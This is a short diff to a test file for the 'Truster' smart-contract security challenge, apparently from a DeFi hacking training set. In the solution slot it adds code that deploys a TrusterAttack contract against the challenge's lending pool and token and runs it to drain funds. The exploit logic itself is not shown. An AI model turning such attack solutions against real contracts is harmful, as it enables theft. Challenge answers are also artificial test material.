@@ -23,6 +23,8 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let attack = await (await ethers.getContractFactory('TrusterAttack', deployer)).deploy(pool.address, token.address, player.address);
+        await attack.attack();
     });
 
     after(async function () {
